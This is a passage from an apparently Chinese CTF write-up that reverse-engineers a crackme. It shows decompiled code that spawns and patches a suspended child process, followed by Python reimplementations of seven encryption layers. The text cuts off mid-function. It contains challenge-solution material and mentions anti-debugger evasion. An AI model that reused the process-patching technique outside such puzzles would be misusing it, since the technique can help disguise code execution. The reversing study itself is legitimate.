class="number">0</span>;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_52;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        v14 = <span class="number">1</span>;</span><br><span class="line">LABEL_52:</span><br><span class="line">        <span class="keyword">if</span> ( v14 )</span><br><span class="line">        &#123;</span><br><span class="line">          (*(v48 + <span class="number">36</span>))(v43);                 <span class="comment">// ResumeThread</span></span><br><span class="line">          v35 = <span class="number">2</span>;</span><br><span class="line">          <span class="keyword">if</span> ( (*(v48 + <span class="number">60</span>))(v42, <span class="number">30000</span>) )    <span class="comment">// WaitForSingleObject</span></span><br><span class="line">          &#123;</span><br><span class="line">            (*(v48 + <span class="number">64</span>))(v42, <span class="number">2</span>);            <span class="comment">// TerminateProcess</span></span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v18 = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">if</span> ( (*(v48 + <span class="number">52</span>))(v42, &amp;v18) &amp;&amp; v18 != <span class="number">2</span> )<span class="comment">// GetExitCodeProcess</span></span><br><span class="line">              v35 = v18;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">if</span> ( v35 == <span class="number">2</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">strcpy</span>(v25, <span class="string">&quot;Unknown Error&quot;</span>);</span><br><span class="line">            (*(v48 + <span class="number">88</span>))(<span class="number">0</span>, v25, v25, <span class="number">0</span>);    <span class="comment">// MessageBoxA</span></span><br><span class="line">            (*(v48 + <span class="number">16</span>))(<span class="number">0</span>);                 <span class="comment">// ExitProcess</span></span><br><span class="line">            v13 = <span class="number">0</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="keyword">if</span> ( v43 )</span><br><span class="line">            &#123;</span><br><span class="line">              (*(v48 + <span class="number">64</span>))(v42, <span class="number">2</span>);          <span class="comment">// TerminateProcess</span></span><br><span class="line">              (*(v48 + <span class="number">40</span>))(v43);             <span class="comment">// CloseHandle</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ( v42 )</span><br><span class="line">              (*(v48 + <span class="number">40</span>))(v42);             <span class="comment">// CloseHandle</span></span><br><span class="line">            <span class="keyword">if</span> ( v35 != <span class="number">1</span> )</span><br><span class="line">              (*(v48 + <span class="number">16</span>))(<span class="number">0</span>);               <span class="comment">// ExitProcess</span></span><br><span class="line">            v13 = v35;</span><br><span class="line">          &#125;</span><br><span class="line">          v33 = v13;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">LABEL_69:</span><br><span class="line">          v34 = <span class="number">2</span>;</span><br><span class="line">          <span class="built_in">strcpy</span>(v24, <span class="string">&quot;Unknown Error&quot;</span>);</span><br><span class="line">          (*(v48 + <span class="number">88</span>))(<span class="number">0</span>, v24, v24, <span class="number">0</span>);      <span class="comment">// MessageBoxA</span></span><br><span class="line">          (*(v48 + <span class="number">16</span>))(<span class="number">0</span>);                   <span class="comment">// ExitProcess</span></span><br><span class="line">          v12 = <span class="number">0</span>;</span><br><span class="line">          v33 = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v33 = <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v33 = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v33 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strcpy</span>(v23, <span class="string">&quot;SUCCESS!&quot;</span>);</span><br><span class="line">      <span class="built_in">strcpy</span>(v26, <span class="string">&quot;INFO&quot;</span>);</span><br><span class="line">      (*(custom + <span class="number">88</span>))(<span class="number">0</span>, v23, v26, <span class="number">0</span>);       <span class="comment">// MessageBoxA</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  (*(custom + <span class="number">16</span>))(<span class="number">0</span>);                        <span class="comment">// ExitProcess</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></div><p>其行为主要是：</p><ol><li>获得输入框内容，判断输入长度在 1 ~ 128 之间</li><li>新建一个子进程  crackme.exe 并挂起</li><li>在子进程中申请一片空间 A 并写入输入内容</li><li>将子进程 start 函数开头改为直接调用 sub_401000，并传入 A 的地址</li><li>启动子进程，等待子进程执行结束，获取其退出码，<strong>若为 1 则正确</strong></li></ol><p>故父进程只起到检查作用，只需关心子进程的核心逻辑 sub_401000。该函数形似 sub_402D4C，都是先找到一众函数地址，然后再执行自己的逻辑：</p><ol><li>通过 Decompress 函数解压释放代码</li><li>调用前 6 个加密函数对输入进行加密</li><li>调用最后一个函数对输入进行最后一次加密的同时校验输入</li></ol><p><img src="/img/article/20221204/4.png" alt="sub_401000"></p><p>因此，本题的题意应该就是分析这 7 种加密方式再写脚本还原了。</p><h2 id="一叶障目"><a href="#一叶障目" class="headerlink" title="一叶障目"></a>一叶障目</h2><p>一开始我用 x32dbg 启动父进程，用 IDA 附加子进程。在跟进第一个加密函数后，天真的我按下了 F5，当听到电脑的风扇声时，我意识到问题没有那么简单。同时，我发现对同一组输入，输出的加密结果竟然每次都不一样，那八成是存在调试器检测了。</p><p>反正也反编译不出来，所以我交换了一下，用 IDA 与 x32dbg 来分别调试父、子进程，方便用插件隐藏调试器。这次对于同一组输入，输出果然固定了下来。</p><p>在汇编层面进行一些分析后，我发现本题的每个加密函数中都存在非常多的无用代码，应该是用来做代码膨胀的，这直接导致 IDA 需要分析大量无用逻辑来生成伪代码。虽然一直等下去有可能能跑出来，但是我怕还没看到伪代码就该下一题了，于是就采用选择明文攻击及对输入下硬件访问断点（简称连蒙带猜）来找到和还原加密逻辑。</p><h2 id="山重水复"><a href="#山重水复" class="headerlink" title="山重水复"></a>山重水复</h2><h3 id="第一次加密"><a href="#第一次加密" class="headerlink" title="第一次加密"></a>第一次加密</h3><ol><li>找到 128 以内的质数作为下标数组，访问输入，对对应下标的字符进行查表替换</li><li>与已知数组逐字节异或</li></ol><p>Python 描述：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc1</span>(<span class="params">plain: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">    tbl = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;b466efcad9ebb6423614b123b5abd400b0bb96e430a87e5e872daa0147a03dd2dae185f5ff0cfdad07aff2c8739446fce77f1570baf3085f0aa38d1fe6056dc44d31881799c6b26b831c80db6927fac22eec4b2f62a4d339bc6a4a8633bf929144b9cdacf6976ce9906554747609e249f0f9a2139a1632f4823f6f290b5a22b39c4e68d0c1e041ae6428d5048f9f78cc1d180d675be5487b19edd7dd55590e258e2c4012601e10bdc571f851c721c01b45e83ba1f76e2b8cb7d60fde35892a1a7d95d1723ca53411b8525c75ee9bf1fba96179c9203ec337817ccb5798dcbe243a586302d8ea4f43849d064c9efee3a7a68a0356938b7ace385326cfdf775d50&quot;</span>)</span><br><span class="line"></span><br><span class="line">    pp = <span class="string">b&quot;0123456789ABCDEF&quot;</span> * <span class="number">8</span></span><br><span class="line">    ee = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;3031157034f3365f3839418843994546307f32703435365f38394142439945b23031323334f3363738a34188434445b23031323334f336373839418543994546303132703435365f38a34142434445b2303132703435363738a3414243444546307f323334f3365f3839418843994546307f32333435363738394142434445b2&quot;</span>)</span><br><span class="line">    idxs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ee)):</span><br><span class="line">        <span class="keyword">if</span> ee[i] != pp[i]:</span><br><span class="line">            idxs.append(i)</span><br><span class="line"></span><br><span class="line">    cc = <span class="built_in">list</span>(pp)</span><br><span class="line">    cipher = <span class="built_in">list</span>(plain)</span><br><span class="line">    <span class="keyword">for</span> idx <span class="keyword">in</span> idxs:</span><br><span class="line">        cc[idx] = tbl[pp[idx]]</span><br><span class="line">        cipher[idx] = tbl[plain[idx]]</span><br><span class="line"></span><br><span class="line">    rr = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;0b3a177e1fc61b4a70304b8958ad0560115632373b7020731c1a5b55059e658c232e150c31cf3507288173885e5c76ba2200731d2ab0130124117b8501a47d0f3c250b7470021c4617a5434146434ebf2122256d2b101f1c17967a7f00030c096326535653985b2e47bac803d60ed8e597d281868bf4f3f0ebe6a2a7aaabb449&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cc)):</span><br><span class="line">        cipher[i] ^= cc[i] ^ rr[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(cipher)</span><br></pre></td></tr></table></figure><h3 id="第二次加密"><a href="#第二次加密" class="headerlink" title="第二次加密"></a>第二次加密</h3><ol><li>逐字节查表替换</li><li>前后 64 字节位置调换</li><li>按 32 字节划分为 4 组，1、3 组位置交换</li><li>与已知数组逐字节异或</li><li>2、4 组位置交换</li><li>与已知数组逐字节异或</li></ol><p>Python 描述：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc2</span>(<span class="params">plain: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">    tbl = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;38393a3b3c3d3e3f404142434445464748494a4b4c4d4e4f505152535455565758595a000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f202122232425262728292a2b2c2d2e2f3031323334353637716e66655e61696b5d64676f5c606a7063685b6d5f626c8788898a8b8c8d8e8f909192939495969798999a9b9c9d9e9fa0a1a2a3a4a5a6a7a8a9aaabacadaeafb0b1b2b3b4b5b6b7b8b9babbbcbdbebfc0c1c2c3c4c5c6c7c8c9cacbcccdcecfd0d1d2d3d4d5d6d7d8d9dadbdcdddedfe0e1e2e3e4e5e6e7e8e9eaebecedeeeff0f1f2f3f4f5f6f7f8f9fafbfcfdfeff72737475767778797a7b7c7d7e7f80818283848586&quot;</span>)</span><br><span class="line"></span><br><span class="line">    pp = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;5a69aef84e591d6a7a3a3ef22d6b781f40e463b16a23265316102e227058189d727d445b60503301225206f32b2f0bab7353224a7b2f15072e1b0efe746200706d765af221511a661d763636333033ae707174eb7a43191a1d450f08757071763294020102075d0e4db0bd78a3c8a59ac660d0d1daa7f5f6e1ecd7d0dfd8c958&quot;</span>)</span><br><span class="line">    cc = <span class="built_in">list</span>(pp)</span><br><span class="line">    cipher = <span class="built_in">list</span>(plain)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line">        cc[i] = tbl[pp[i]]</span><br><span class="line">        cipher[i] = tbl[plain[i]]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">        cc[i], cc[<span class="number">0x80</span>-i-<span class="number">1</span>] = cc[<span class="number">0x80</span>-i-<span class="number">1</span>], cc[i]</span><br><span class="line">        cipher[i], cipher[<span class="number">0x80</span>-i-<span class="number">1</span>] = cipher[<span class="number">0x80</span>-i-<span class="number">1</span>], cipher[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">        cc[i], cc[<span class="number">0x40</span>+i] = cc[<span class="number">0x40</span>+i], cc[i]</span><br><span class="line">        cipher[i], cipher[<span class="number">0x40</span>+i] = cipher[<span class="number">0x40</span>+i], cipher[i]</span><br><span class="line"></span><br><span class="line">    rr = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;680567cabc021234390d1ed230593e9cc250360d412f2e553e2e386c711999bb8f646b9c500264121a186ac43ec4222d93415f434746dd02370b7402256ad50455bf8f97818915916565a6f4fad443f8868aefa6a5fcf10159470c16141db429977f1142703e7e7940727203b2288f6a2ff41971056669f0183c5c4013ae0458&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cc)):</span><br><span class="line">        cipher[i] ^= cc[i] ^ rr[i]</span><br><span class="line"></span><br><span class="line">    cc = <span class="built_in">list</span>(rr)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x20</span>):</span><br><span class="line">        cc[<span class="number">0x20</span>+i], cc[<span class="number">0x60</span>+i] = cc[<span class="number">0x60</span>+i], cc[<span class="number">0x20</span>+i]</span><br><span class="line">        cipher[<span class="number">0x20</span>+i], cipher[<span class="number">0x60</span>+i] = cipher[<span class="number">0x60</span>+i], cipher[<span class="number">0x20</span>+i]</span><br><span class="line"></span><br><span class="line">    rr = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;f6b0c1702bb6869da6bcba77bde9b92f51db99a5efa3a6d4b8b2bcc0c781342b14dd80ccd0a3e8c0e7c0f79a198205f8b46e99fe90e4ca51afb5e498ca74df8488615077606bf6758083411c1369ac087036514d500731f9b5a9b3efeee95eda7ddf9a71a7c3a6d1deddac03f60de8e65f8c918c97970fd1e3dea2d5db962af9&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cc)):</span><br><span class="line">        cipher[i] ^= cc[i] ^ rr[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(cipher)</span><br></pre></td></tr></table></figure><h3 id="第三次加密"><a href="#第三次加密" class="headerlink" title="第三次加密"></a>第三次加密</h3><ol><li>相邻字节两两交换位置</li><li>与已知数组逐字节错位异或</li><li>前后 64 字节位置调换</li><li>逐字节加 0x80</li></ol><p>Python 描述：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc3</span>(<span class="params">plain: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">    tbl = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;c4189868c047179a23f21a2f75ffd837eb1c7d1861cdf1b74914c18590e1616d7bd4f82307d23443325c3c1aeddff337e4ae04e36d2506bd4ea1f351bd3f8ca1974465b774ac094bdb56552fe61bfc579daa9b47710921084a979b12601de096438c39b57b9bfe9e0e196ceb9a9632a14c5c7e3291bd9017d0db023a8f002eb2&quot;</span>)</span><br><span class="line">    tbl = <span class="built_in">list</span>(tbl)</span><br><span class="line">    cipher = <span class="built_in">list</span>(plain)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher), <span class="number">2</span>):</span><br><span class="line">        cipher[i], cipher[i+<span class="number">1</span>] = cipher[i+<span class="number">1</span>], cipher[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tbl)):</span><br><span class="line">        tbl[i] ^= cipher[(<span class="number">0x75</span> + i) % <span class="number">128</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x40</span>):</span><br><span class="line">        tbl[i], tbl[<span class="number">0x80</span>-i-<span class="number">1</span>] = tbl[<span class="number">0x80</span>-i-<span class="number">1</span>], tbl[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(tbl)):</span><br><span class="line">        tbl[i] = (tbl[i] + <span class="number">0x80</span>) &amp; <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(tbl)</span><br></pre></td></tr></table></figure><h3 id="第四次加密"><a href="#第四次加密" class="headerlink" title="第四次加密"></a>第四次加密</h3><p>与已知数组逐字节加</p><p>Python 描述：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc4</span>(<span class="params">plain: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">    cipher = <span class="built_in">list</span>(plain)</span><br><span class="line"></span><br><span class="line">    pp1 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;a53f0c50366abda69abc3ecf6f580d6be2286767b4b24360f7cdf44e9c88f5931131d090a4b71fd9e1e0957144ed5f7dbc2ceceece0a5291bf6db45b822f9587c5954189bf76d9d7bf713f0aa36ceeb414f393794788f7754208923f11de80144e78c441def8bb74decb3a47247b014001990f031fb08b788c3512a3361749d3&quot;</span>)</span><br><span class="line">    cc1 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;a642115b4c77f1b5fdba36cb428a409f17f2309fdea03474e6d0f7519f8bf8961434d393a7ba22dce4e3987447f05876b525e5e7c7034b8ab866ad547b289082c0903c84ba71d4d2ba6c3a059e67f5bb1bfa9a804e8ffe7c490f994618e587144e78c441def8bb74decb3a472483094809a1170b27b89380943d1aab3e0c3ec8&quot;</span>)</span><br><span class="line">    dis = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(pp1)):</span><br><span class="line">        dis.append((cc1[i] - pp1[i]) &amp; <span class="number">0xFF</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">        cipher[i] += dis[i]</span><br><span class="line">        cipher[i] &amp;= <span class="number">0xFF</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(cipher)</span><br></pre></td></tr></table></figure><h3 id="第五次加密"><a href="#第五次加密" class="headerlink" title="第五次加密"></a>第五次加密</h3><ol><li>前 64 字节倒序排列</li><li>逐字节查表替换</li><li>与已知数组逐字节异或</li></ol><p>Python 描述：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc5</span>(<span class="params">plain: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">    cipher = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x30</span>, -<span class="number">1</span>, -<span class="number">0x10</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xF</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            cipher.append(plain[i+j])</span><br><span class="line">    cipher += <span class="built_in">list</span>(plain[<span class="number">0x40</span>:])</span><br><span class="line">    tbl = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;d5a04a5de8a503a8dd2d980a4d8f901234023d5545b73f2cbabc07c70186df532961253e09217b85b60895300bb09e6bdbf9af51844950d210ebac2b48c56a74cdfd1d314bd6f3b381367e9c582f4c6c0513635a419b387c6519d047c4927a6fefb15783271a71d8fa2ae142a28ceaff166400561e374328ab06c9c3d3a614aeb5e6969a9d5f2615f223a7a34e8772ec208059a440f70ce7bb33ede2ee0f8eb20e3c916824754660a17932b8738b76d11fda8d22f00dc011c2e0665ed79ffe88dc7d8aca4404d417c61b94f654694f6de5be3b6ecbf18278f4def5bd2ece67c835ad7752c17fb99339f8e418bfd9cfb489cc5c1cfcaa3a7062fb5be3a99997e9&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x80</span>):</span><br><span class="line">        cipher[i] = tbl[cipher[i]]</span><br><span class="line"></span><br><span class="line">    pp = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;9620b6c3418b71c2a79c5d17937f210d436589b31ebb52c12e256660a46e84450c62a3b21370e5b91e840e67b2db5c2cb2cda71df65066990dcc285847021d46dc20489d6664cb3b66a2aca58ed8aa5ec75bedb54cec97d3361233f3ba7f15454cab44fd67625e1e67f6acb3099a2d812d3c2c0a85c2a4b540c507b86a4d6ac6&quot;</span>)</span><br><span class="line">    cc = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;1e76d27f22bf0ba060c447584fa9b895954c4a32bdc046d036cd250181466efc2f002f48486ec74947015bcc5249878f274d2cfb1ab6a9b9a362ca9cff8f586ac125846ea7c2acf7c225d7662ca5b39e5387ca66b8687d953a4d09b09436291f92e9a38ace7ce6cdd1ba7464e488dc9118143ec808ec822e4438538100d068b3&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line">        cipher[i] ^= pp[i] ^ cc[i]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(cipher)</span><br></pre></td></tr></table></figure><h3 id="第六次加密"><a href="#第六次加密" class="headerlink" title="第六次加密"></a>第六次加密</h3><p>与已知数组逐字节异或</p><p>Python 描述：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc6</span>(<span class="params">plain: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">    p = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;cf00fa1ac6497c69840b0c74e6d8c2ad50e23957b7b581e678aac75be30e61d895f5d38858be754f4dcf567f9f1cf0cc89fed6aee83cf43e20c8c8fadbc6f2cbd16eca9559b795199d171848be19fa92a30f49b7dc3ec2f54599d28e29a38546bc459e3b969792d0fb06532ac838a4c8fd72055c12d398bbd1f5ad497a5a831b&quot;</span>)</span><br><span class="line">    c = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;5a125abad541706a858bf87f4354c5ab409259b7e73511f6589a87ab23de41f885c5d2855fbf7a4d44df76ef7fec30fc005fe6ee885cb41e60e8880a1b16d2ebe11efa65eabc97298c061940be6770a8132f0907acaedbc505dbf2e563b7ad50eec6ee66e6f7b240eb0603bad868f498ed52956c62f3a8cbe1863b497658ae6b&quot;</span>)</span><br><span class="line">    tbl = [p[i] ^ c[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p))]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([tbl[i] ^ plain[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain))])</span><br></pre></td></tr></table></figure><h3 id="第七次加密及校验"><a href="#第七次加密及校验" class="headerlink" title="第七次加密及校验"></a>第七次加密及校验</h3><ol><li>逐字节查表替换 × 7</li><li>加密结束，与目标数组比较</li></ol><p>Python 描述：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc7</span>(<span class="params">plain: <span class="built_in">bytes</span></span>) -&gt; <span class="built_in">bytes</span>:</span></span><br><span class="line">    tbl1 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;588d51e8d4d9a5c53094c6bab325c238a4c8aaf74e2e603b3ab2a975a12316fb64e42478322631434bbcb8ac639b7e871b42b59e612a866e4cd2355ad6e9b91db77fa8537bd7de799a745f0bf001ade24a3d98651e6cd8dbabe5442221cb507615565c2972896d418c8e19e1919df2063f1a7d978a8392dc77f936cf48a0c78214e3963984b188284611afa352fe10f457f1e0ca547ca27049a72db6d090da7a67c3bd1cf6f52b9308691359624feaced3eceb5ed10e04204d0f8bbbc9bf03059ccc40dfef853e3cf3ffd50a272fee8f6a1ffd955d817355dde75b6f18c4ae450d689fc012edcd0c33f8fc2c003747bee634a666b0b49971806b07fac1170209&quot;</span>)</span><br><span class="line">    tbl2 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;35b3a22a08d483add97fb6c277933814aa1341488d79eca0f6529df8a64d30fa6124b557658ef9f0d1c3c41acd252f676aa44c17686682c7cc6343e987dd8cb2ea3f7cfc6d115db8b1bd562cc186b044056236a8399427ae7b80df73e5e233e3d3cba7859b9991d0006921e66e9806372b8bf42e95a3cf0c7119530410c96b3aee1b88e12397d6f2d54fe4be4270ffe8de5c7db9f126a9843bced2bcc6d83d501c81db2d6045493e587692c512fb9c54ba070290ef477e75af18bb51f5209a9631349f599e46bfa1ca89014a5a1f1e5bf78fb7d7fe5ee01528e7dcda725f55030d64744b29c04e78ab40226f1d09f3a516c8fd6cac8a0fed0a3c327a0b0eebb4&quot;</span>)</span><br><span class="line">    tbl3 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;7f9458886cfd2dafe88538c7287bebeeb925894fd2053a0cde8ffccb65ad45c959e12b2f4372c381db8eab010677075e74bc03628c543d3718e279840a307e2e83f95746d15b1a1f116820a76495710b5627a350bbc102e035b582d333ca4a0eef26f413b786acc83ed8759d233b934ca15ab6a0048b8a551922be61e69690c099c69ed7603241f087e9aa175f7c4b1b0d40ffb34269e410faa9d62cf5edbad9480f4ef378d014f7a66eaea870669a52801d34366b5da4ecdf0891ce9c4992a221cc2a6df8bd514d6ae55ce767b0f2f12412989b29b4b197fbc453cdda44e3dd1e6f31dc3cc576ead5f673c28d3f1ccf477aa50039fe7db215d4b863bf9f1609&quot;</span>)</span><br><span class="line">    tbl4 = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;4f8a646ddee94796105c220be55999d3319533ff1821ab3d2d78291e7758844db99ff851357d2b666ec2b15e2cdc5fd742ae98371fe2439cd94bcadfec9761398334676345366270243f877e467ca203d47394a41da6bb1add8cebd6d8be93feb419a832002a0a11c94ced28f3fc8ea0a1f675c0ce0754fbb512ea914e9dc7746014ac8f385ac152501c539bf1c4e36a4a41b2e8e19071b3cc0c57f9d2ada523bd7615effdbcf5af85dae068f4c8fa69d5256b273b891655db9ee448b69aee80f7170406b0921bcfbf6f86727bf05db713ba050f01e6aa2fc35b7a026ccda32ea9c53c568882e78d3e8120cb0d79f244653a260830a7b84940d07fc6d18b0e09&quot;</span>)</span><br><span class="line">    tbl5 = 